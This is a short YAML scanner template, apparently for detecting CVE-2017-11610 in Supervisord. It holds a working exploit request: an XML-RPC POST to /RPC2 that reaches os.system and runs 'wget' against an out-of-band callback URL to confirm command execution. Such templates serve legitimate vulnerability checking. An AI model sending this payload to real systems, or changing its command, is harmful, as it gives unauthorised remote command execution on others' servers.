detail:
  author: Loneyer
  links:
  - https://github.com/vulhub/vulhub/tree/master/supervisor/CVE-2017-11610
expression: r0()
manual: true
name: poc-yaml-supervisord-cve-2017-11610
rules:
  r0:
    expression: response.status == 200 && reverse.wait(5)
    request:
      body: "<?xml version=\"1.0\"?>\n      <methodCall>\n      <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>\n\
        \      <params>\n      <param>\n      <string>wget {{reverseURL}}</string>\n\
        \      </param>\n      </params>\n      </methodCall>"
      cache: true
      follow_redirects: false
      method: POST
      path: /RPC2
set:
  reverse: newReverse()
  reverseURL: reverse.url
transport: http
